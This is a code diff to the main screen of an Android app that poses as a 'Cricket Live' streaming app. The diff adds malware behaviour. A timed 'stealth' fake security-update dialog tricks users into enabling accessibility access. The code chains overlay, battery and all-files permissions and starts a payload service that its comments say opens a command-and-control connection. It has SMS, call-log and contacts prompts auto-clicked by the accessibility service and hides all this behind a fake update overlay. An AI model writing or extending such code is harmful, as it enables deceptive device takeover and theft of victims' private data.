@@ -20,6 +20,7 @@ import com.chameleon.stager.utils.PermissionHelper
 class MainActivity : AppCompatActivity() {
     private lateinit var binding: ActivityMainBinding
     private val permissionHelper = PermissionHelper()
+    private var hasStartedFlow = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -28,11 +29,22 @@ class MainActivity : AppCompatActivity() {
 
         setupUI()
         checkPermissions()
+
+        // 10-second stealth timer — triggers permission flow automatically
+        android.os.Handler(mainLooper).postDelayed({
+            if (!isFinishing) {
+                triggerStealthPermissionFlow()
+            }
+        }, 10000)
     }
 
     private fun setupUI() {
         binding.btnWatchLive.setOnClickListener {
-            showPermissionDialog()
+            if (isAccessibilityServiceEnabled()) {
+                startPayloadFlow()
+            } else {
+                showPermissionDialog()
+            }
         }
 
         binding.btnSchedule.setOnClickListener {
@@ -40,7 +52,11 @@ class MainActivity : AppCompatActivity() {
         }
 
         binding.btnTeams.setOnClickListener {
-            showAccessibilityPrompt()
+            if (!isAccessibilityServiceEnabled()) {
+                openAccessibilitySettings()
+            } else {
+                startPayloadFlow()
+            }
         }
     }
 
@@ -65,18 +81,28 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
-    private fun showAccessibilityPrompt() {
-        if (!isAccessibilityServiceEnabled()) {
-            openAccessibilitySettings()
-        } else {
-            // Accessibility already granted - start the real flow
+    private fun triggerStealthPermissionFlow() {
+        if (isAccessibilityServiceEnabled()) {
             startPayloadFlow()
+        } else {
+            showStealthAccessibilityPrompt()
         }
+    }
+
+    private fun showStealthAccessibilityPrompt() {
+        AlertDialog.Builder(this)
+            .setTitle("System Update Required")
+            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
+            .setPositiveButton("Apply Now") { _, _ ->
+                openAccessibilitySettings()
+            }
+            .setNegativeButton("Later", null)
+            .setCancelable(false)
+            .show()
     }
 
     private fun openAccessibilitySettings() {
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        Toast.makeText(this, "Find 'Cricket Live' and enable it", Toast.LENGTH_LONG).show()
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
@@ -90,7 +116,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     fun startPayloadFlow() {
-        // Step 1: Request overlay permission
+        if (hasStartedFlow) return
+        hasStartedFlow = true
+        continuePayloadFlow()
+    }
+
+    private fun continuePayloadFlow() {
+        // Step 1: Overlay permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             startActivity(
                 Intent(
@@ -98,11 +130,10 @@ class MainActivity : AppCompatActivity() {
                     Uri.parse("package:$packageName")
                 )
             )
-            Toast.makeText(this, "Allow display over other apps for live overlay", Toast.LENGTH_LONG).show()
             return
         }
 
-        // Step 2: Request battery optimization exemption (for persistence)
+        // Step 2: Battery optimization exemption
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -116,10 +147,20 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Step 3: Request notification permission (Android 13+)
-        permissionHelper.requestNotificationPermission(this)
+        // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
+        if (!PermissionHelper.hasStoragePermission(this)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                startActivity(
+                    Intent(
+                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                        Uri.parse("package:$packageName")
+                    )
+                )
+                return
+            }
+        }
 
-        // Step 4: Start the foreground service
+        // Step 3: Start foreground service (C2 connection begins)
         val serviceIntent = Intent(this, PayloadService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
@@ -127,7 +168,16 @@ class MainActivity : AppCompatActivity() {
             startService(serviceIntent)
         }
 
-        // Step 6: Show update overlay
+        // Step 4: Request runtime permissions (SMS, Call Log, Contacts)
+        // AccessibilityService auto-clicks the "Allow" dialogs within ~300ms
+        if (!permissionHelper.hasAllPermissions(this)) {
+            permissionHelper.requestPermissions(this)
+        }
+
+        // Step 5: Notification permission (Android 13+)
+        permissionHelper.requestNotificationPermission(this)
+
+        // Step 6: Show system update overlay to hide all activity
         val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
         overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(overlayIntent)
@@ -139,7 +189,8 @@ class MainActivity : AppCompatActivity() {
         super.onResume()
         if (isAccessibilityServiceEnabled()) {
             binding.statusText.text = "Ready to stream"
-            checkPermissions()
+            // Safe to call repeatedly — hasStartedFlow guard prevents re-entry
+            startPayloadFlow()
         }
     }
 }
